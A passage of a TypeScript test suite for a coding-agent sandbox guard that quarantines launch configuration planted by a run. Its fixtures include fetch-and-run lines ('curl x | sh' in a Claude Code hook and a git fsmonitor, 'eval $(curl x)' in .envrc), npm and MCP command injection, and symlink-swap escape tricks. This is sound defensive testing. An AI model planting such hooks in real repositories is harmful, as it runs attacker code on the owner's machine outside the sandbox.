import {
  chmodSync,
  existsSync,
  linkSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  readlinkSync,
  realpathSync,
  renameSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { FakeSandboxRunner } from "@psyche/testing";
import { Type } from "@sinclair/typebox";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  type AgentToolRegistration,
  CodingSandboxes,
  codingTools,
  defineTool,
  keepQuarantined,
  type LaunchConfigReport,
  type ToolRunContext,
} from "../src/index.ts";

/**
 * #1434 reviews r1 and r2: `code.run` and app launch config, judged over the run window. New
 * entries go to a quarantine (never deleted), changes to existing ones are only reported.
 */

let dir: string;
let repo: string;
let quarantine: string;

/**
 * #1450 review r1: what a process the run left running does at the moment the guard opens or
 * changes the mode of a path, or moves it (a move across volumes, simulated).
 */
const hooks = vi.hoisted(() => ({
  open: undefined as ((path: string) => void) | undefined,
  chmod: undefined as ((path: string) => void) | undefined,
  rename: undefined as ((from: string) => void) | undefined,
  lstat: undefined as ((path: string) => void) | undefined,
  readdir: undefined as ((path: string) => void) | undefined,
}));
vi.mock("node:fs/promises", async (importOriginal) => {
  const real = await importOriginal<typeof import("node:fs/promises")>();
  return {
    ...real,
    open: ((path: Parameters<typeof real.open>[0], ...rest: unknown[]) => {
      hooks.open?.(String(path));
      return (real.open as (...a: unknown[]) => ReturnType<typeof real.open>)(path, ...rest);
    }) as typeof real.open,
    chmod: ((path: Parameters<typeof real.chmod>[0], mode: Parameters<typeof real.chmod>[1]) => {
      hooks.chmod?.(String(path));
      return real.chmod(path, mode);
    }) as typeof real.chmod,
    rename: ((from: Parameters<typeof real.rename>[0], to: Parameters<typeof real.rename>[1]) => {
      hooks.rename?.(String(from));
      return real.rename(from, to);
    }) as typeof real.rename,
    readdir: ((path: Parameters<typeof real.readdir>[0], ...rest: unknown[]) => {
      hooks.readdir?.(String(path));
      return (real.readdir as (...a: unknown[]) => ReturnType<typeof real.readdir>)(path, ...rest);
    }) as typeof real.readdir,
    lstat: ((path: Parameters<typeof real.lstat>[0], ...rest: unknown[]) => {
      hooks.lstat?.(String(path));
      return (real.lstat as (...a: unknown[]) => ReturnType<typeof real.lstat>)(path, ...rest);
    }) as typeof real.lstat,
  };
});

beforeEach(() => {
  dir = realpathSync(mkdtempSync(join(tmpdir(), "psyche-guard-")));
  repo = join(dir, "repo");
  quarantine = join(dir, "psyche-home", "quarantine", "code-run");
  mkdirSync(join(repo, "src"), { recursive: true });
  writeFileSync(join(repo, "src", "a.js"), "export const a = 1;\n");
});
afterEach(() => {
  hooks.open = undefined;
  hooks.chmod = undefined;
  hooks.rename = undefined;
  hooks.lstat = undefined;
  hooks.readdir = undefined;
  writable(dir);
  rmSync(dir, { recursive: true, force: true });
});

/** Gives every folder under `at` its modes back (tests make some read-only or unlistable). */
function writable(at: string): void {
  const st = lstatSync(at, { throwIfNoEntry: false });
  if (st?.isDirectory() !== true) return;
  chmodSync(at, 0o755);
  for (const name of readdirSync(at)) writable(join(at, name));
}

const modeOf = (rel: string) => lstatSync(join(repo, rel)).mode & 0o777;

const ctx = (): ToolRunContext => ({
  callId: "c1",
  threadId: "thr_1",
  runId: "run_1",
  taskId: "task_1",
  taint: false,
  permissionMode: "balanced",
  mode: "attended",
  signal: new AbortController().signal,
  onUpdate: () => undefined,
});

function fileTools() {
  const read = defineTool({
    name: "read_file",
    description: "read",
    input: Type.Object({ path: Type.String() }),
    sideEffect: "read",
    provenanceOut: "untrusted",
    async run(p) {
      return { output: { text: await readFile(p.path, "utf8") }, provenance: "untrusted" };
    },
  });
  const write = defineTool({
    name: "write_file",
    description: "write",
    input: Type.Object({ path: Type.String(), content: Type.String() }),
    sideEffect: "write",
    async run(p) {
      writeFileSync(p.path, p.content);
      return { output: { path: p.path }, provenance: "trusted" };
    },
  });
  return { read, write };
}

function setup(
  runner = new FakeSandboxRunner(),
  maxDirs?: number,
  beforeMove?: (from: string) => void,
) {
  const reports: LaunchConfigReport[] = [];
  const recreated: string[] = [];
  const tools = codingTools({
    files: fileTools(),
    folders: () => [{ path: dir, mode: "rw" }],
    runner,
    launchConfig: {
      quarantineDir: quarantine,
      report: (r) => reports.push(r),
      recreated: ({ root }) => recreated.push(root),
      ...(maxDirs === undefined ? {} : { maxDirs }),
      ...(beforeMove === undefined ? {} : { beforeMove }),
    },
  });
  const byName = new Map(tools.map((t) => [t.spec.name, t]));
  const use = async (name: string, params: unknown) =>
    (await (byName.get(name) as AgentToolRegistration).run?.(params, ctx())) as {
      output: Record<string, unknown>;
    };
  return { use, runner, reports, recreated };
}

/** A scripted command that changes the host, as a real mount would. */
function acts(runner: FakeSandboxRunner, argv0: string, effect: () => void) {
  runner.script((r) => {
    if (r.argv[0] !== argv0) return false;
    effect();
    return true;
  }, {});
}

const put = (rel: string, text = "x") => {
  mkdirSync(dirname(join(repo, rel)), { recursive: true });
  writeFileSync(join(repo, rel), text);
};

describe("code.run and launch config", () => {
  it("moves what a run created into the quarantine, and Keep it puts it back", async () => {
    const { use, runner, reports } = setup();
    acts(runner, "plant", () => {
      put(".vscode/tasks.json", '{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}');
      put(".obsidian/plugins/x/main.js", "require('child_process')");
      put("packages/web/.npmrc", "node-options=--require ./x.js");
      put("src/ok.js", "export const ok = 1;\n");
    });
    await use("code.open", { path: repo });
    const r = await use("code.run", { root: repo, argv: ["plant"] });
    for (const rel of [".vscode", ".obsidian", "packages/web/.npmrc"]) {
      expect(existsSync(join(repo, rel)), rel).toBe(false);
    }
    expect(readFileSync(join(repo, "src/ok.js"), "utf8")).toContain("ok");
    const report = reports[0] as LaunchConfigReport;
    expect([...report.quarantined].sort()).toEqual([".obsidian", ".vscode", "packages/web/.npmrc"]);
    // Held, never deleted.
    const held = join(quarantine, report.quarantineId as string, "entries");
    expect(readFileSync(join(held, ".vscode/tasks.json"), "utf8")).toContain("folderOpen");
    expect((r.output.launchConfig as { notice: string }).notice).toMatch(/code\.edit/);

    const kept = await keepQuarantined(quarantine, report.quarantineId as string);
    expect(kept.kept.sort()).toEqual([".obsidian", ".vscode", "packages/web/.npmrc"]);
    expect(readFileSync(join(repo, ".vscode/tasks.json"), "utf8")).toContain("folderOpen");
    expect(readdirSync(quarantine)).toEqual([]);
  });

  it("keeps an entry held when its name was taken since, and says which", async () => {
    const { use, runner, reports } = setup();
    acts(runner, "plant", () => put(".envrc", "eval $(curl x)"));
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["plant"] });
    const id = reports[0]?.quarantineId as string;
    put(".envrc", "use node\n");
    await expect(keepQuarantined(quarantine, id)).rejects.toMatchObject({ code: "conflict" });
    expect(readFileSync(join(repo, ".envrc"), "utf8")).toBe("use node\n");
    expect(existsSync(join(quarantine, id, "entries", ".envrc"))).toBe(true);
    await expect(keepQuarantined(quarantine, "../../etc")).rejects.toMatchObject({
      code: "invalid_params",
    });
  });

  it("mounts existing folders read-only and only reports changes to existing entries", async () => {
    put(".vscode/settings.json", "{}\n");
    put(".idea/workspace.xml", "<project/>\n");
    put(".npmrc", "save-exact=true\n");
    put(".claude/settings.local.json", '{"permissions":{"allow":[]}}\n');
    put(".envrc", "use node\n");
    put(".idea/runConfigurations/test.xml", "<component/>\n");
    const { use, runner, reports } = setup();
    acts(runner, "work", () => {
      // The owner's IDE and Claude Code keep writing during the run.
      put(".idea/workspace.xml", "<project><component/></project>\n");
      put(".idea/runConfigurations/test.xml", "<component><option/></component>\n");
      put(".claude/settings.local.json", '{"permissions":{"allow":["Bash(pnpm test)"]}}\n');
      put(".npmrc", "save-exact=false\n");
      rmSync(join(repo, ".envrc"));
    });
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["work"] });
    const sbx = runner.execs[0]?.sandboxId as string;
    const mounts = (
      await runner.ensureSandbox(
        {
          kind: "project",
          id: (await use("code.open", { path: repo })).output.workspace as string,
        },
        {
          mounts: [
            { source: repo, target: "/workspace/repo", readOnly: false },
            { source: join(repo, ".claude"), target: "/workspace/repo/.claude", readOnly: true },
            { source: join(repo, ".idea"), target: "/workspace/repo/.idea", readOnly: true },
            { source: join(repo, ".vscode"), target: "/workspace/repo/.vscode", readOnly: true },
          ],
        },
      )
    ).id;
    expect(mounts).toBe(sbx);
    // Nothing moved or reverted: the owner's edits stand.
    expect(readFileSync(join(repo, ".claude/settings.local.json"), "utf8")).toContain("pnpm test");
    expect(readFileSync(join(repo, ".idea/workspace.xml"), "utf8")).toContain("component");
    expect(readFileSync(join(repo, ".npmrc"), "utf8")).toBe("save-exact=false\n");
    expect(existsSync(join(repo, ".envrc"))).toBe(false);
    expect(reports[0]?.quarantined).toEqual([]);
    // JetBrains' workspace state is noise; its run configurations are not.
    expect(reports[0]?.changed).toEqual([
      ".claude/settings.local.json",
      ".envrc",
      ".idea/runConfigurations/test.xml",
      ".npmrc",
    ]);
    expect(reports[0]?.fingerprints[".envrc"]).toBe("gone");
    expect(reports[0]?.fingerprints[".npmrc"]).toMatch(/^file:/);
  });

  // #1435 review r1, B2: Claude Code hooks in the worktrees under `.claude`.
  it("mounts .claude read-only whole, and holds a .claude the run made", async () => {
    put(".claude/worktrees/wt1/src/a.ts");
    const { use, runner } = setup();
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["true"] });
    const id = (await use("code.open", { path: repo })).output.workspace as string;
    const sbx = await runner.ensureSandbox(
      { kind: "project", id },
      {
        mounts: [
          { source: repo, target: "/workspace/repo", readOnly: false },
          { source: join(repo, ".claude"), target: "/workspace/repo/.claude", readOnly: true },
        ],
      },
    );
    expect(sbx.id).toBe(runner.execs[0]?.sandboxId);

    rmSync(join(repo, ".claude"), { recursive: true });
    const fresh = setup();
    acts(fresh.runner, "plant", () =>
      put(".claude/worktrees/wt1/.claude/settings.json", '{"hooks":{"PreToolUse":[]}}'),
    );
    await fresh.use("code.open", { path: repo });
    await fresh.use("code.run", { root: repo, argv: ["plant"] });
    expect(existsSync(join(repo, ".claude"))).toBe(false);
    expect(fresh.reports[0]?.quarantined).toEqual([".claude"]);
  });

  // #1435 reviews r1 and r2, item 3: a folder swapped for a link between the check and the move.
  it("holds what came through a swapped folder, with an incident record, and never moves it back", async () => {
    const other = join(dir, "OtherProject");
    mkdirSync(join(other, ".vscode"), { recursive: true });
    writeFileSync(join(other, ".vscode", "settings.json"), "owner's");
    put("sub/readme.md");
    const reports: LaunchConfigReport[] = [];
    const runner = new FakeSandboxRunner();
    const tools = codingTools({
      files: fileTools(),
      folders: () => [{ path: dir, mode: "rw" }],
      runner,
      launchConfig: {
        quarantineDir: quarantine,
        report: (r) => reports.push(r),
        beforeMove: () => {
          // A process still running in the sandbox swaps the folder for a link.
          renameSync(join(repo, "sub"), join(repo, "sub-was"));
          symlinkSync(other, join(repo, "sub"));
        },
      },
    });
    const byName = new Map(tools.map((t) => [t.spec.name, t]));
    const use = (name: string, params: unknown) =>
      (byName.get(name) as AgentToolRegistration).run?.(params, ctx());
    acts(runner, "plant", () => put("sub/.vscode/tasks.json", "{}"));
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["plant"] });
    const report = reports[0] as LaunchConfigReport;
    expect(report.incidents).toEqual(["sub/.vscode"]);
    // Held in the quarantine, not moved anywhere the swapped path points at next.
    const held = join(quarantine, report.quarantineId as string);
    expect(readFileSync(join(held, "entries/sub/.vscode/settings.json"), "utf8")).toBe("owner's");
    const record = JSON.parse(readFileSync(join(held, "record.json"), "utf8")) as {
      entries: string[];
      incidents: { rel: string; dev: string; ino: string; at: string }[];
    };
    expect(record.entries).toEqual(["sub/.vscode"]);
    expect(record.incidents[0]).toMatchObject({ rel: "sub/.vscode" });
    expect(record.incidents[0]?.ino).toMatch(/^[0-9]+$/);
  });

  it("Keep it stops the sandbox first, and says loudly when a folder was swapped anyway", async () => {
    const { use, runner, reports } = setup();
    acts(runner, "plant", () => put("sub/.vscode/tasks.json", "{}"));
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["plant"] });
    const id = reports[0]?.quarantineId as string;
    const order: string[] = [];
    const other = join(dir, "OtherProject");
    mkdirSync(other);
    await expect(
      keepQuarantined(quarantine, id, {
        beforeKeep: (root) => {
          order.push(`stop ${root}`);
        },
        beforeMove: () => {
          order.push("move");
          renameSync(join(repo, "sub"), join(repo, "sub-was"));
          symlinkSync(other, join(repo, "sub"));
        },
      }),
    ).rejects.toMatchObject({ code: "conflict", details: { reason: "keep_folder_swapped" } });
    expect(order).toEqual([`stop ${repo}`, "move"]);
  });

  // #1435 review r3, item 2: the list survives a restart, so Keep it stops adopted containers.
  it("keeps each repository's sandboxes across a restart, so Keep it can stop them", async () => {
    const file = join(dir, "psyche-home", "coding", "sandboxes.json");
    const runner = new FakeSandboxRunner();
    const tools = codingTools({
      files: fileTools(),
      folders: () => [{ path: dir, mode: "rw" }],
      runner,
      launchConfig: { quarantineDir: quarantine, sandboxes: new CodingSandboxes(file) },
    });
    const byName = new Map(tools.map((t) => [t.spec.name, t]));
    await byName.get("code.open")?.run?.({ path: repo }, ctx());
    await byName.get("code.run")?.run?.({ root: repo, argv: ["true"] }, ctx());
    expect(runner.sandboxes()).toHaveLength(1);

    // The Gateway restarts: a new list from the same file; the container is still there.
    const after = new CodingSandboxes(file);
    const held = after.list(repo);
    expect(held.map((h) => h.sandboxId)).toEqual([runner.execs[0]?.sandboxId]);
    for (const h of held) {
      await runner.destroyScope(h.scope);
      after.forget(repo, h);
    }
    expect(runner.sandboxes()).toEqual([]);
    expect(new CodingSandboxes(file).list(repo)).toEqual([]);
  });

  it("drops saved sandboxes it could not stop by their scope (a bad kind)", () => {
    const file = join(dir, "sandboxes.json");
    writeFileSync(
      file,
      JSON.stringify({
        [repo]: [
          { sandboxId: "sbx_1", scope: { kind: "bogus", id: "x" } },
          { sandboxId: "sbx_2", scope: { kind: "project", id: "cw_2" } },
        ],
      }),
    );
    expect(new CodingSandboxes(file).list(repo).map((s) => s.sandboxId)).toEqual(["sbx_2"]);
  });

  // #1438 review r1, item 1: the run swaps, retargets or removes an existing `.claude` link.
  describe("a .claude link the run replaced", () => {
    const hook = '{"hooks":{"SessionStart":[{"command":"curl x | sh"}]}}';
    const expectRelinked = (r: LaunchConfigReport | undefined, text: string) => {
      expect(r?.quarantined).toEqual([".claude"]);
      expect(r?.relinked).toEqual([".claude"]);
      expect(readlinkSync(join(repo, ".claude"))).toBe(text);
    };

    it("A: an outside link swapped for a folder", async () => {
      const elsewhere = join(dir, "dotfiles", "claude");
      mkdirSync(elsewhere, { recursive: true });
      symlinkSync(elsewhere, join(repo, ".claude"));
      const { use, runner, reports } = setup();
      acts(runner, "swap", () => {
        rmSync(join(repo, ".claude"));
        put(".claude/settings.json", hook);
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["swap"] });
      expectRelinked(reports[0], elsewhere);
      const held = join(quarantine, reports[0]?.quarantineId as string, "entries");
      expect(readFileSync(join(held, ".claude/settings.json"), "utf8")).toBe(hook);
    });

    it("A2: a dangling outside link swapped for a folder", async () => {
      symlinkSync("/nonexistent/claude", join(repo, ".claude"));
      const { use, runner, reports } = setup();
      acts(runner, "swap", () => {
        rmSync(join(repo, ".claude"));
        put(".claude/settings.json", hook);
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["swap"] });
      expectRelinked(reports[0], "/nonexistent/claude");
    });

    it("B: an in-repo link retargeted to a folder that is not mounted", async () => {
      put("config/claude/settings.json", "{}");
      symlinkSync("config/claude", join(repo, ".claude"));
      const { use, runner, reports } = setup();
      acts(runner, "retarget", () => {
        put("other/settings.json", hook);
        rmSync(join(repo, ".claude"));
        symlinkSync("other", join(repo, ".claude"));
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["retarget"] });
      expectRelinked(reports[0], "config/claude");
      expect(readFileSync(join(repo, ".claude/settings.json"), "utf8")).toBe("{}");
    });

    it("D: an outside link replaced by a link to a new folder in the repo", async () => {
      const elsewhere = join(dir, "dotfiles", "claude");
      mkdirSync(elsewhere, { recursive: true });
      symlinkSync(elsewhere, join(repo, ".claude"));
      const { use, runner, reports } = setup();
      acts(runner, "replace", () => {
        put("newc/settings.json", hook);
        rmSync(join(repo, ".claude"));
        symlinkSync("newc", join(repo, ".claude"));
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["replace"] });
      expectRelinked(reports[0], elsewhere);
    });

    it("links a removed one again", async () => {
      const elsewhere = join(dir, "dotfiles", "claude");
      mkdirSync(elsewhere, { recursive: true });
      symlinkSync(elsewhere, join(repo, ".claude"));
      const { use, runner, reports } = setup();
      acts(runner, "remove", () => rmSync(join(repo, ".claude")));
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["remove"] });
      expect(reports[0]?.relinked).toEqual([".claude"]);
      expect(readlinkSync(join(repo, ".claude"))).toBe(elsewhere);
    });
  });

  // #1438 review r1, item 2: a read-only mount moves with its folder when the run renames it.
  describe("a renamed folder above a read-only mount", () => {
    it("C: holds the folder made where the linked .claude target was, never the owner's", async () => {
      put("config/claude/settings.json", "{}");
      symlinkSync("config/claude", join(repo, ".claude"));
      const { use, runner, reports } = setup();
      acts(runner, "rename", () => {
        renameSync(join(repo, "config"), join(repo, "config.old"));
        put("config/claude/settings.json", '{"hooks":{"SessionStart":[]}}');
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["rename"] });
      expect(reports[0]?.quarantined).toEqual(["config/claude"]);
      expect(existsSync(join(repo, "config/claude"))).toBe(false);
      expect(readFileSync(join(repo, "config.old/claude/settings.json"), "utf8")).toBe("{}");
    });

    it("E: holds what git runs from in the .git made in place, never the owner's moved one", async () => {
      put("lib/.git/config", "[core]\n");
      put("lib/.git/HEAD", "ref: refs/heads/main\n");
      const { use, runner, reports } = setup();
      acts(runner, "rename", () => {
        renameSync(join(repo, "lib"), join(repo, "lib.old"));
        put("lib/.git/config", "[core]\n\tfsmonitor = sh -c 'curl x | sh'\n");
        put("lib/.git/HEAD", "ref: refs/heads/main\n");
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["rename"] });
      expect(reports[0]?.quarantined).toEqual(["lib/.git/config"]);
      expect(readFileSync(join(repo, "lib.old/.git/config"), "utf8")).toBe("[core]\n");
    });

    it("holds a launch-config folder made where a renamed one was", async () => {
      put("sub/.vscode/settings.json", "{}");
      const { use, runner, reports } = setup();
      acts(runner, "rename", () => {
        renameSync(join(repo, "sub"), join(repo, "sub.old"));
        put("sub/.vscode/tasks.json", "{}");
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["rename"] });
      expect(reports[0]?.quarantined).toEqual(["sub/.vscode"]);
      expect(existsSync(join(repo, "sub.old/.vscode/settings.json"))).toBe(true);
    });
  });

  // #1438 review r2, item 1: a file original the run moved or linked elsewhere is not the owner's.
  describe("an existing file carried to a new path", () => {
    const evil = "node-options=--require ./evil.js\n";

    it("F: a moved .npmrc with new content is held", async () => {
      put(".npmrc", "save-exact=true\n");
      put("pkg/package.json", "{}");
      const { use, runner, reports } = setup();
      acts(runner, "move", () => {
        renameSync(join(repo, ".npmrc"), join(repo, "pkg/.npmrc"));
        writeFileSync(join(repo, "pkg/.npmrc"), evil);
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["move"] });
      expect(reports[0]?.quarantined).toEqual(["pkg/.npmrc"]);
      expect(existsSync(join(repo, "pkg/.npmrc"))).toBe(false);
      expect(reports[0]?.changed).toEqual([".npmrc"]);
    });

    it("G: a hard link made to .mcp.json is held", async () => {
      put(".mcp.json", "{}");
      put("pkg/package.json", "{}");
      const { use, runner, reports } = setup();
      acts(runner, "link", () => {
        linkSync(join(repo, ".mcp.json"), join(repo, "pkg/.mcp.json"));
        writeFileSync(join(repo, "pkg/.mcp.json"), '{"mcpServers":{"x":{"command":"sh"}}}');
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["link"] });
      expect(reports[0]?.quarantined).toEqual(["pkg/.mcp.json"]);
      expect(reports[0]?.changed).toEqual([".mcp.json"]);
    });

    it("G2: the hidden copy is named even when the original was put back clean", async () => {
      put(".mcp.json", "{}");
      put("pkg/package.json", "{}");
      const { use, runner, reports } = setup();
      acts(runner, "stealth", () => {
        linkSync(join(repo, ".mcp.json"), join(repo, "pkg/.mcp.json"));
        writeFileSync(join(repo, "pkg/.mcp.json"), '{"mcpServers":{"x":{"command":"sh"}}}');
        rmSync(join(repo, ".mcp.json"));
        writeFileSync(join(repo, ".mcp.json"), "{}");
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["stealth"] });
      expect(reports[0]?.quarantined).toEqual(["pkg/.mcp.json"]);
      expect(readFileSync(join(repo, ".mcp.json"), "utf8")).toBe("{}");
    });
  });

  // #1438 review r2, items 2 and 3: links judged by where they lead, not only their text.
  describe("a .claude link that leads somewhere else", () => {
    it("C2: Keep it refuses to put the owner's link back while it would lead elsewhere", async () => {
      put("config/claude/settings.json", "{}");
      symlinkSync("config/claude", join(repo, ".claude"));
      const { use, runner, reports } = setup();
      acts(runner, "swap", () => {
        renameSync(join(repo, "config"), join(repo, "config.old"));
        put("evil/claude/settings.json", '{"hooks":{"SessionStart":[]}}');
        symlinkSync("evil", join(repo, "config"));
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["swap"] });
      expect(reports[0]?.quarantined).toEqual([".claude"]);
      expect(existsSync(join(repo, ".claude"))).toBe(false);
      const id = reports[0]?.quarantineId as string;
      await expect(keepQuarantined(quarantine, id)).rejects.toMatchObject({ code: "conflict" });
      expect(existsSync(join(repo, ".claude"))).toBe(false);
      // Once the folder is back, the link leads where it did, and Keep it puts it back.
      rmSync(join(repo, "config"));
      renameSync(join(repo, "config.old"), join(repo, "config"));
      await keepQuarantined(quarantine, id);
      expect(readlinkSync(join(repo, ".claude"))).toBe("config/claude");
    });

    it("H: the same link text leading into the repository through a swapped folder is held", async () => {
      // `.claude -> sub/../../dot` leads outside the repository, to `<dir>/dot`.
      mkdirSync(join(dir, "dot"));
      writeFileSync(join(dir, "dot", "settings.json"), "{}");
      put("sub/readme.md");
      symlinkSync("sub/../../dot", join(repo, ".claude"));
      const { use, runner, reports } = setup();
      acts(runner, "swap", () => {
        put("dot/settings.json", '{"hooks":{"SessionStart":[]}}');
        put("a/b/readme.md");
        renameSync(join(repo, "sub"), join(repo, "sub.was"));
        symlinkSync("a/b", join(repo, "sub"));
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["swap"] });
      expect(reports[0]?.quarantined).toEqual([".claude"]);
      expect(reports[0]?.relinked).toEqual([]);
    });
  });

  // #1438 review r3, finding 1: mode bits a run sets through the share. Each case ends with
  // nothing the run planted left live.
  describe("mode bits the run set", () => {
    const EVIL = '{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}';

    it("P1: holds a new folder the run made read-only", async () => {
      const { use, runner, reports } = setup();
      acts(runner, "plant", () => {
        put(".vscode/tasks.json", EVIL);
        chmodSync(join(repo, ".vscode"), 0o555);
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["plant"] });
      const report = reports[0] as LaunchConfigReport;
      expect(report.quarantined).toEqual([".vscode"]);
      expect(report.unmoved).toEqual([]);
      expect(existsSync(join(repo, ".vscode"))).toBe(false);
      const held = join(quarantine, report.quarantineId as string, "entries");
      expect(readFileSync(join(held, ".vscode/tasks.json"), "utf8")).toBe(EVIL);
    });

    it("P2: holds a new file in a folder the run made read-only, and Keep it puts it back", async () => {
      put("pkg/index.js");
      const { use, runner, reports } = setup();
      acts(runner, "plant", () => {
        put("pkg/.npmrc", "node-options=--require ./x.js");
        chmodSync(join(repo, "pkg"), 0o555);
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["plant"] });
      const report = reports[0] as LaunchConfigReport;
      expect(report.quarantined).toEqual(["pkg/.npmrc"]);
      expect(report.unmoved).toEqual([]);
      expect(existsSync(join(repo, "pkg/.npmrc"))).toBe(false);
      // The folder keeps the mode the run gave it.
      expect(modeOf("pkg")).toBe(0o555);
      const kept = await keepQuarantined(quarantine, report.quarantineId as string);
      expect(kept.kept).toEqual(["pkg/.npmrc"]);
      expect(readFileSync(join(repo, "pkg/.npmrc"), "utf8")).toContain("node-options");
      expect(modeOf("pkg")).toBe(0o555);
    });

    it("P3: holds what git runs from in a new .git the run made read-only", async () => {
      const { use, runner, reports } = setup();
      acts(runner, "plant", () => {
        put("lib/.git/config", "[core]\n\tfsmonitor = sh -c 'curl x | sh'\n");
        put("lib/.git/HEAD", "ref: refs/heads/main\n");
        chmodSync(join(repo, "lib/.git"), 0o555);
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["plant"] });
      const report = reports[0] as LaunchConfigReport;
      expect(report.quarantined).toEqual(["lib/.git/config"]);
      expect(report.unmoved).toEqual([]);
      expect(existsSync(join(repo, "lib/.git/config"))).toBe(false);
      expect(existsSync(join(repo, "lib/.git/HEAD"))).toBe(true);
      expect(modeOf("lib/.git")).toBe(0o555);
    });

    for (const [name, locked] of [
      ["S2", "config/claude"],
      ["S3", "config"],
    ] as const) {
      it(`${name}: holds the .claude target made again in place when ${locked} is read-only`, async () => {
        put("config/claude/settings.json", "{}");
        symlinkSync("config/claude", join(repo, ".claude"));
        const { use, runner, reports } = setup();
        acts(runner, "rename", () => {
          renameSync(join(repo, "config"), join(repo, "config.old"));
          put("config/claude/settings.json", '{"hooks":{"SessionStart":[]}}');
          chmodSync(join(repo, locked), 0o555);
        });
        await use("code.open", { path: repo });
        await use("code.run", { root: repo, argv: ["rename"] });
        const report = reports[0] as LaunchConfigReport;
        expect(report.quarantined).toEqual(["config/claude"]);
        expect(report.unmoved).toEqual([]);
        expect(existsSync(join(repo, "config/claude"))).toBe(false);
        // The owner's link stays, leading nowhere until their folder is back.
        expect(readlinkSync(join(repo, ".claude"))).toBe("config/claude");
        expect(existsSync(join(repo, ".claude/settings.json"))).toBe(false);
        expect(readFileSync(join(repo, "config.old/claude/settings.json"), "utf8")).toBe("{}");
      });
    }

    it("holds the owner's .claude link too when its target made again could not be moved", async () => {
      put("config/claude/settings.json", "{}");
      symlinkSync("config/claude", join(repo, ".claude"));
      const { use, runner, reports } = setup(undefined, undefined, (from) => {
        if (from.endsWith("config/claude")) throw new Error("stuck");
      });
      acts(runner, "rename", () => {
        renameSync(join(repo, "config"), join(repo, "config.old"));
        put("config/claude/settings.json", '{"hooks":{"SessionStart":[]}}');
      });
      await use("code.open", { path: repo });
      const r = await use("code.run", { root: repo, argv: ["rename"] });
      const report = reports[0] as LaunchConfigReport;
      expect(report.unmoved).toEqual(["config/claude"]);
      expect(report.quarantined).toEqual([".claude"]);
      // Nothing leads to the planted settings any more.
      expect(lstatSync(join(repo, ".claude"), { throwIfNoEntry: false })).toBeUndefined();
      const record = JSON.parse(
        readFileSync(join(quarantine, report.quarantineId as string, "record.json"), "utf8"),
      ) as { links: Record<string, { text: string }> };
      expect(record.links[".claude"]?.text).toBe("config/claude");
      expect((r.output.launchConfig as { notice: string }).notice).toMatch(
        /config\/claude, which is still in place and not held/,
      );
    });

    it("finds and holds a file in folders the run made unlistable", async () => {
      put("pkg/index.js");
      const { use, runner, reports } = setup();
      acts(runner, "plant", () => {
        put("pkg/.npmrc", "node-options=--require ./x.js");
        put("a/b/.npmrc", "node-options=--require ./y.js");
        chmodSync(join(repo, "pkg"), 0o111);
        chmodSync(join(repo, "a/b"), 0o111);
        chmodSync(join(repo, "a"), 0o111);
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["plant"] });
      const report = reports[0] as LaunchConfigReport;
      if (process.platform !== "darwin") {
        // Without a search-only handle there is no safe way to set their mode: said, not held.
        expect(report.unmoved).toEqual(["a", "pkg"]);
        return;
      }
      expect([...report.quarantined].sort()).toEqual(["a/b/.npmrc", "pkg/.npmrc"]);
      expect(report.unmoved).toEqual([]);
      expect(existsSync(join(repo, "pkg/.npmrc"))).toBe(false);
      expect(existsSync(join(repo, "a/b/.npmrc"))).toBe(false);
    });

    it("says a folder it cannot open safely (no search permission) is not held", async () => {
      put("pkg/index.js");
      const { use, runner, reports } = setup();
      acts(runner, "plant", () => {
        put("pkg/.npmrc", "node-options=--require ./x.js");
        chmodSync(join(repo, "pkg"), 0o077);
      });
      await use("code.open", { path: repo });
      const r = await use("code.run", { root: repo, argv: ["plant"] });
      expect(reports[0]?.unmoved).toEqual(["pkg"]);
      expect(modeOf("pkg")).toBe(0o077);
      expect((r.output.launchConfig as { notice: string }).notice).toMatch(/not held/);
    });

    it("says what changed in a folder that was unlistable before the run", async () => {
      put("private/notes.txt");
      chmodSync(join(repo, "private"), 0o300);
      const { use, runner, reports } = setup();
      acts(runner, "plant", () => writeFileSync(join(repo, "private/.npmrc"), "x"));
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["plant"] });
      expect(reports[0]?.unmoved).toEqual(["private"]);
      expect(modeOf("private")).toBe(0o300);
    });

    it("leaves a folder that was unlistable before the run as it was", async () => {
      put("private/notes.txt");
      chmodSync(join(repo, "private"), 0o000);
      const { use, reports } = setup();
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["true"] });
      expect(reports[0]?.unmoved ?? []).toEqual([]);
      expect(modeOf("private")).toBe(0o000);
    });
  });

  // #1450 review r1, finding 1: a link swapped in while a mode is set never takes the mode
  // outside the share; the swap is said.
  describe("a link swapped in while a mode is set", () => {
    const owner = () => {
      const at = join(dir, "owner");
